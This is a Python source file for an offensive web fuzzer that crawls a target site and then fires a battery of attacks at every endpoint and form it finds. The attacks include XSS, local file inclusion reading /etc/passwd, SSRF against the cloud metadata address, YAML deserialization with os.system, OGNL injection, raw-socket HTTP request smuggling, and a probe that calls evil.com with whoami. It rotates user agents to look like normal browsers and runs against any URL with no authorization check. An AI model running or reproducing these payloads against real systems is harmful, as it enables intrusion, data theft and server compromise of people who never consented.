#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════
                   P H P  •  J S • S U P E R  •  F U Z Z E R
                                 ( v5.5 )
                          Haroon Ahmad Awan
                            Powered by AI
═══════════════════════════════════════════════════════════════════════════
• Dynamic SPA crawler (Angular / React / Vue / Lit / Next / Svelte / HTMX)
• Discovers:
      – DOM links / router‑links / hash‑routes
      – XHR / fetch / GraphQL / REST / Web‑socket endpoints
      – Hidden iframes & Shadow‑DOM nodes
      – All HTML forms (GET & POST)  →  auto‑fuzz fields
• New CLI: --use-ai to enable LLM-driven mutation
• Improved ai_mutate: uses MaskedLM for context and CausalLM for new variants
• Fully‑loaded attack arsenal:
      – Multi‑stage param recursion  
      – Protocol‑scheme abuse (gopher/file/data/blob/php://filter)
      – Split‑eval chain & header/body smuggling (CRLF / chunk‑desync / HTTP2 smuggle)
      – Legacy unicode / double‑encode bypass
      – MIME‑type confusion, multipart boundary smashing, php://input RCE
      – JS prototype‑pollution, ShadowDOM, MutationObserver, clipboard hijack
      – Web‑socket XSS, async/await race, iframe sandbox clone
      – AI‑style payload mutation (reversible/encode/scramble)
      – PHP‑LFI, SSRF, RCE via stream wrappers, YAML injection, OGNL injection
      – HTTP/2 & HTTP/3 smuggling, QUIC header fuzz
• Hardened Playwright loader (timeout+retry + proxy + system‑Chrome + AUTOHOOK)
• Form‑wait + screenshot in debug mode
• Friendly User‑Agent rotation for all requests
• Windows‑safe UTF‑8 logger  →  `super_fuzz2_v5_5.log`
═══════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import argparse
import subprocess
import atexit
import requests
import random
import urllib.parse
import socket
import http.client
import time
import contextlib
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, urlencode, quote
from pathlib import Path
from bs4 import BeautifulSoup
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

# ── AI Models ──────────────────────────────────────────────────────────
USE_AI = False
AI_ENABLED = False
try:
    from transformers import AutoTokenizer, AutoModelForMaskedLM, AutoModelForCausalLM
    # Masked LM for subtle context-aware alterations
    MLM_TOKENIZER = AutoTokenizer.from_pretrained("microsoft/codebert-base")
    MLM_MODEL     = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
    # Causal LM for generative variants
    CLM_TOKENIZER = AutoTokenizer.from_pretrained("microsoft/CodeGPT-small-py")
    CLM_MODEL     = AutoModelForCausalLM.from_pretrained("microsoft/CodeGPT-small-py")
    MLM_MODEL.eval()
    CLM_MODEL.eval()
    AI_ENABLED = True
except Exception:
    AI_ENABLED = False

# ── Configuration ──────────────────────────────────────────────────────
PAGE_TIMEOUT    = 60_000  # ms
RETRIES         = 1
LOG_FILE        = Path("super_fuzz2_v5_6.log")
LOG_FILE.write_text("", encoding="utf-8")  # reset

# ── Friendly User‑Agents ───────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
]

# ── Globals set by CLI ─────────────────────────────────────────────────
DEBUG            = False
THREADS          = 10
PROXY            = None
CHROME_PATH      = None
AUTOHOOK         = False
CDP_ENDPOINT     = None
CDP_PORT         = 9222
chrome_proc      = None
BROWSER_OVERRIDE = None
SHOW_REQ_RES     = False  # Enable request/response logging

# ── Helpers ─────────────────────────────────────────────────────────────
def get_random_ua():
    return random.choice(USER_AGENTS)

def log(msg, tag="*"):
    prefix = "[DEBUG]" if DEBUG and tag == "*" else f"[{tag}]"
    line = f"{prefix} {msg}"
    try:
        print(line)
    except UnicodeEncodeError:
        print(line.encode("ascii", "ignore").decode())
    with open(LOG_FILE, "a", encoding="utf-8") as fp:
        fp.write(line + "\n")

# ── Request/Response wrapper ────────────────────────────────────────────
def do_request(method, url, **kwargs):
    if SHOW_REQ_RES:
        log(f"[REQ] {method.upper()} {url} {kwargs}", "REQ")
    r = requests.request(method, url, **kwargs)
    if SHOW_REQ_RES:
        log(f"[RES] {r.status_code} {r.text[:200]}", "RES")
    return r

# ── Playwright helper ──────────────────────────────────────────────────
def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
    global PROXY, CHROME_PATH, CDP_ENDPOINT, BROWSER_OVERRIDE
    if CDP_ENDPOINT:
        if BROWSER_OVERRIDE is None:
            try:
                BROWSER_OVERRIDE = p.chromium.connect_over_cdp(CDP_ENDPOINT)
            except Exception as e:
                log(f"[!] CDP attach failed – {e}", "!")
                sys.exit(1)
        browser = BROWSER_OVERRIDE
    else:
        if BROWSER_OVERRIDE is None:
            launch_args = [
                "--disable-web-security",
                "--disable-blink-features=AutomationControlled",
                "--no-proxy-server",
                "--proxy-bypass-list=*",
                "--dns-prefetch-disable",
            ]
            launch_kwargs = {
                "headless": not DEBUG,
                "args": launch_args,
                **({"executable_path": CHROME_PATH} if CHROME_PATH else {"channel": "chrome"})
            }
            BROWSER_OVERRIDE = p.chromium.launch(**launch_kwargs)
        browser = BROWSER_OVERRIDE

    for attempt in range(1, retries + 1):
        try:
            ctx = browser.new_context(
                ignore_https_errors=True,
                user_agent=get_random_ua(),
                viewport={"width": 1280, "height": 800},
            )
            ctx.set_default_navigation_timeout(timeout)
            page = ctx.new_page()
            page.goto(url, wait_until="domcontentloaded", timeout=timeout)
            with contextlib.suppress(PWTimeout):
                page.wait_for_load_state("networkidle", timeout=10_000)
            try:
                page.wait_for_selector("form", timeout=15_000)
            except PWTimeout:
                log("[!] No <form> appeared after 15s", "!")
            if DEBUG:
                Path("screenshots").mkdir(exist_ok=True)
                shot = f"screenshots/{quote(url, safe='')}.png"
                page.screenshot(path=shot, full_page=True)
                log(f"[+] Screenshot → {shot}", "+")
            return browser, ctx, page
        except Exception as e:
            log(f"Playwright fail ({attempt}/{retries}) – {e}", "!")
            time.sleep(0.5)

    log("[~] Falling back to requests()", "·")
    try:
        sess = requests.Session(); sess.trust_env = False
        r = sess.get(url, timeout=20, verify=False, headers={"User-Agent": get_random_ua()})
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        DummyPage = type("DummyPage", (), {
            "query_selector_all": soup.select,
            "evaluate": lambda self, *_: [],
            "on": lambda self, *a, **k: None,
            "wait_for_load_state": lambda *a, **k: None,
        })
        log("[+] Static fallback loaded", "+")
        return None, None, DummyPage()
    except Exception as e:
        log(f"[!] Static fallback failed – {e}", "!")
        return None, None, None

# ── AI‑style payload mutator ───────────────────────────────────────────
def ai_mutate(payload):
    """Generate sophisticated variants using pretrained models if enabled."""
    if AI_ENABLED and USE_AI:
        try:
            # Causal LM generation
            inputs = CLM_TOKENIZER.encode(payload, return_tensors="pt")
            outputs = CLM_MODEL.generate(
                inputs,
                max_length=min(inputs.shape[-1] + 32, 128),
                num_return_sequences=1,
                do_sample=True,
                top_k=50
            )
            variant = CLM_TOKENIZER.decode(outputs[0], skip_special_tokens=True)
            return variant or payload
        except Exception:
            pass
    # Fallback simple variants
    variants = [
        payload[::-1],
        urllib.parse.quote(payload),
        payload.replace(" ", "%20"),
        payload.replace("id", "whoami"),
        payload.replace("alert", "Function('al'+'ert()')()"),
        ''.join(random.sample(payload, len(payload))),
    ]
    return random.choice(variants)

# ── Form fuzzer ────────────────────────────────────────────────────────
def fuzz_html_form(action, method, fields):
    samples = {
        "id":     "whoami",
        "q":      "<svg/onload=alert(1)>",
        "x":      "gopher://127.0.0.1/._/._/payload",
        "search": "data:text/html,<script>alert(9)</script>",
        "file":   "php://filter/convert.base64-encode/resource=index.php",
    }
    data = {f: ai_mutate(random.choice(list(samples.values()))) for f in fields}
    headers = {"User-Agent": get_random_ua()}
    try:
        if method == "post":
            r = do_request("post", action, data=data, timeout=2, headers=headers)
        else:
            r = do_request("get", action, params=data, timeout=2, headers=headers)
        if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
            log(f"Form vulnerable → {action}", "✓")
    except Exception as e:
        if DEBUG: log(f"Form fuzz error {action} – {e}", "!")

# ── Server‑side attack modules ─────────────────────────────────────────
def recursive_param(u):
    for s in ["?x=http://evil.com?y=whoami", "?next=/admin?cmd=id", "?eval=phpinfo()"]:
        try:
            r = do_request("get", u + s, timeout=2, headers={"User-Agent": get_random_ua()})
            if any(x in r.text for x in ("uid=", "root:")):
                log(f"Recursive RCE → {u + s}", "✓")
        except:
            pass

def protocol_abuse(u):
    for proto in [
        "gopher://127.0.0.1:11211/_stats", "file:///etc/passwd",
        "blob:http://localhost", "data:text/html,<script>alert(6)</script>",
        "php://input", "php://filter/convert.base64-encode/resource=index.php"
    ]:
        try:
            r = do_request("get", u + "?p=" + quote(proto), timeout=2, headers={"User-Agent": get_random_ua()})
            if any(x in r.text for x in ("uid=", "root:")):
                log(f"Protocol abuse → {proto}", "✓")
        except:
            pass

def split_eval(u):
    for frag in ['";alert', '("XSS")', "';eval", "('`id`')"]:
        try:
            r = do_request("get", u + "?q=" + quote(frag), headers={"User-Agent": get_random_ua()})
            if any(tag in r.text for tag in ("<script", "alert(", "XSS")):
                log(f"Split‑eval → {frag}", "✓")
        except:
            pass

def mime_confuse(u):
    try:
        r = do_request(
            "post", u,
            data="<script>alert(1)</script>",
            headers={"Content-Type": "application/json", "User-Agent": get_random_ua()},
            timeout=2
        )
        if "<script" in r.text:
            log("MIME confusion ✓", "✓")
    except:
        pass

def unicode_path(u):
    for enc in ("%252e%252e", "%c0%ae%c0%ae", "%u202e"):
        try:
            r = do_request("get", f"{u}/{enc}/", timeout=2, headers={"User-Agent": get_random_ua()})
            if "root:" in r.text or "conf" in r.text:
                log(f"Unicode bypass → {enc}", "✓")
        except:
            pass

def lfi_fuzz(u):
    paths = ["/etc/passwd", "/var/www/html/index.php", "/etc/hosts", "../../../../../../etc/passwd"]
    wrappers = ["php://filter/convert.base64-encode/resource=", "expect://id", "input://"]
    for w in wrappers:
        for pth in paths:
            url = f"{u}?file={w}{pth}"
            try:
                r = do_request("get", url, timeout=2, headers={"User-Agent": get_random_ua()})
                if any(x in r.text for x in ("root:", "ID=")):
                    log(f"LFI fuzz → {url}", "✓")
            except:
                pass

def ssrf_fuzz(u):
    for p in ["http://169.254.169.254/latest/meta-data/", "gopher://127.0.0.1:22/"]:
        try:
            r = do_request("get", f"{u}?url={quote(p)}", timeout=2, headers={"User-Agent": get_random_ua()})
            if r.status_code == 200:
                log(f"SSRF fuzz → {p}", "✓")
        except:
            pass

def yaml_injection(u):
    try:
        payload = quote("foo: !!python/object/apply:os.system ['id']")
        r = do_request("get", f"{u}?data={payload}", timeout=2, headers={"User-Agent": get_random_ua()})
        if "uid=" in r.text:
            log("YAML injection ✓", "✓")
    except:
        pass

def ognl_injection(u):
    pay = (
        "%{(#_='multipart/form-data')."
        "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
        ".addHeader('X',#_))}"
    )
    try:
        r = do_request("get", f"{u}?name={quote(pay)}", timeout=2, headers={"User-Agent": get_random_ua()})
        if "X" in r.headers:
            log("OGNL injection ✓", "✓")
    except:
        pass

# ── Client‑side DOM modules ─────────────────────────────────────────────
def dom_clipboard(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.evaluate("document.body.innerHTML+='<input oncopy=fetch(\"http://dns.x\")>'")
        log("Clipboard ✓", "✓")
        br.close()

def dom_proto_poll(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.on("console", lambda m: "[PP]" in m.text and log("Proto polluted", "✓"))
        pg.evaluate(
            "let e=JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');"
            "Object.assign({},e);console.log(\"[PP]\"+{}.polluted)"
        )
        br.close()

def dom_ws_inject(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.on("console", lambda m: "[WS]" in m.text and log("WS XSS", "✓"))
        pg.evaluate(
            'const w=new WebSocket("wss://echo.websocket.events");'
            'w.onopen=()=>w.send("<svg/onload=alert(2)>");'
            'w.onmessage=e=>console.log("[WS]"+e.data);'
        )
        time.sleep(1)
        br.close()

def dom_async(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.evaluate(
            "(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();"
        )
        log("Async race", "✓")
        br.close()

def dom_iframe(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.evaluate(
            "let f=document.createElement('iframe');"
            "f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)"
        )
        log("Iframe clone", "✓")
        br.close()

def dom_mutation(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        pg.evaluate(
            "new MutationObserver(()=>alert('M')).observe(document.body,{childList:true,subtree:true});"
            "document.body.appendChild(document.createElement('div'));"
        )
        log("MutationObs", "✓")
        br.close()

def websocket_fuzz(u, p):
    br, _, pg = open_page(p, u)
    if pg:
        ws = u.replace('http', 'ws')
        pg.evaluate(f'''
            const w=new WebSocket("{ws}/socket");
            w.onopen=()=>w.send("{quote('<svg/onload=alert(5)>')}");
            w.onmessage=e=>console.log("[WF]"+e.data);
        ''')
        time.sleep(1)
        log("WS fuzz", "✓")
        br.close()

# ── Smuggle probes ──────────────────────────────────────────────────────
def crlf_smuggle(host):
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"X-Ignore: 1\r\n\r\n"
        f"POST /admin HTTP/1.1\r\n"
        f"Host: {host}\r\nContent-Length: 0\r\n\r\n"
    )
    try:
        s = socket.create_connection((host, 80), timeout=4)
        s.send(payload.encode())
        s.close()
        log("CRLF smuggle probe sent", "+")
    except Exception as e:
        if DEBUG: log(f"CRLF smuggle error – {e}", "!")

def chunk_desync(host):
    raw = (
        f"POST / HTTP/1.1\r\nHost:{host}\r\n"
        "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    )
    try:
        s = socket.create_connection((host, 80), timeout=4)
        s.send(raw.encode())
        s.close()
        log("Chunk‑desync probe sent", "+")
    except Exception as e:
        if DEBUG: log(f"Chunk‑desync error – {e}", "!")

def http2_smuggle(host):
    try:
        conn = http.client.HTTPConnection(host, 80, timeout=4)
        conn._http_vsn = 32; conn._http_vsn_str = "HTTP/2.0"
        conn.putrequest("SMUGGLE", "/")
        conn.putheader("Host", host)
        conn.endheaders()
        conn.send(b"0\r\n\r\n")
        conn.close()
        log("HTTP2 smuggle sent", "+")
    except Exception as e:
        if DEBUG: log(f"HTTP2 smuggle error – {e}", "!")

# ── Crawl + orchestrate ────────────────────────────────────────────────
def smart_crawl(seed, p):
    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
    seen, endpoints, failed = {seed}, set(), set()
    queue = deque([(seed, 0)])
    while queue:
        url, depth = queue.popleft()
        if depth > 3 or url in failed: continue
        br, ctx, page = open_page(p, url)
        if not page:
            failed.add(url)
            continue

        page.on("request", lambda r: endpoints.add(r.url))
        forms = page.query_selector_all("form")
        log(f"[+] Found {len(forms)} <form> elements on {url}", "+")
        for form in forms:
            action = form.get_attribute("action") or url
            method = (form.get_attribute("method") or "get").lower()
            fields = [
                inp.get_attribute("name") or f"f{i}"
                for i, inp in enumerate(form.query_selector_all("input,textarea,select"), start=1)
            ]
            endpoints.add(urljoin(url, action))
            fuzz_html_form(urljoin(url, action), method, fields)

        with contextlib.suppress(PWTimeout):
            page.wait_for_load_state("networkidle", timeout=2000)

        links = page.evaluate("""() =>
            Array.from(document.querySelectorAll('[href],[routerLink],a'))
                 .map(e => e.href || e.getAttribute('href') || e.getAttribute('routerLink'))
        """)
        br.close()
        for l in set(map(str, links)):
            if l and l.startswith(origin) and l not in seen:
                seen.add(l)
                queue.append((l, depth + 1))

    log(f"Crawl → {len(seen)} pages, {len(endpoints)} endpoints", "+")
    return seen | endpoints

# ── Threaded server‑side fuzz ─────────────────────────────────────────
def run_server(u):
    mods = [
        recursive_param, protocol_abuse, split_eval,
        mime_confuse, unicode_path, lfi_fuzz,
        ssrf_fuzz, yaml_injection, ognl_injection
    ]
    for fn in mods:
        log(f"· Running {fn.__name__} against {u}", "·")
        try:
            fn(u)
        except Exception as e:
            if DEBUG: log(f"  ! {fn.__name__} error: {e}", "!")
        log(f"· Finished {fn.__name__} against {u}", "·")

# ── Main ───────────────────────────────────────────────────────────────
def main():
    global DEBUG, THREADS, PROXY, CHROME_PATH, AUTOHOOK, CDP_ENDPOINT, chrome_proc, SHOW_REQ_RES, USE_AI
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-U", "--threads", type=int, default=10, help="Server‑side threads")
    parser.add_argument("--debug", action="store_true", help="Enable debug (headful + verbose)")
    parser.add_argument("--proxy", help="HTTP/S proxy (e.g. http://proxy:3128)")
    parser.add_argument("--chrome", help="Path to Chrome executable")
    parser.add_argument("--autohook", action="store_true", help="Auto‑hook into Chrome via remote debug")
    parser.add_argument("--show-req-res", action="store_true", help="Enable request/response logging")
    parser.add_argument("--use-ai", action="store_true", help="Enable AI‑powered payload generation")
    args = parser.parse_args()

    DEBUG        = args.debug
    THREADS      = args.threads
    PROXY        = args.proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
    CHROME_PATH  = args.chrome
    AUTOHOOK     = args.autohook
    SHOW_REQ_RES = args.show_req_res
    USE_AI       = args.use_ai and AI_ENABLED
    if args.use_ai and not AI_ENABLED:
        log("[!] AI models not available, falling back to simple mutation", "!")

    # Auto‑hook Chrome setup
    if AUTOHOOK:
        candidates = [CHROME_PATH] if CHROME_PATH else []
        candidates += [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "chrome"
        ]
        chrome_bin = next((c for c in candidates if c and Path(c).exists()), None)
        if not chrome_bin:
            log("[!] Cannot find Chrome, disabling --autohook", "!")
            AUTOHOOK = False
        else:
            CDP_ENDPOINT = f"http://127.0.0.1:{CDP_PORT}"
            data_dir = Path("chrome-user-data").absolute()
            data_dir.mkdir(exist_ok=True)
            chrome_proc = subprocess.Popen([
                chrome_bin,
                f"--remote-debugging-port={CDP_PORT}",
                f"--user-data-dir={data_dir}",
                "--no-first-run", "--no-default-browser-check"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            atexit.register(lambda: chrome_proc.terminate())
            for _ in range(20):
                try:
                    socket.create_connection(("127.0.0.1", CDP_PORT), timeout=0.5).close()
                    break
                except:
                    time.sleep(0.2)
            log(f"[+] Auto‑hook launched Chrome at {CDP_ENDPOINT}", "+")

    log(f"Seed → {args.url}", "◆")
    with sync_playwright() as p:
        scope = smart_crawl(args.url, p)
    log(f"Discovered {len(scope)} targets", "+")

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(run_server, u): u for u in scope}
        for f in as_completed(futures):
            if DEBUG:
                log(f"Completed server fuzz for {futures[f]}", "·")

    host = urlparse(args.url).hostname or args.url
    crlf_smuggle(host)
    chunk_desync(host)
    http2_smuggle(host)

    with sync_playwright() as p:
        for mod in (
            dom_clipboard, dom_proto_poll, dom_ws_inject,
            dom_async, dom_iframe, dom_mutation, websocket_fuzz
        ):
            try:
                mod(args.url, p)
            except Exception as e:
                if DEBUG:
                    log(f"{mod.__name__} error – {e}", "!")

    log("✅ AI‑ENHANCED FUZZER COMPLETE", "✓")

if __name__ == "__main__":
    try:
        main()
    finally:
        if AUTOHOOK and chrome_proc:
            chrome_proc.terminate()
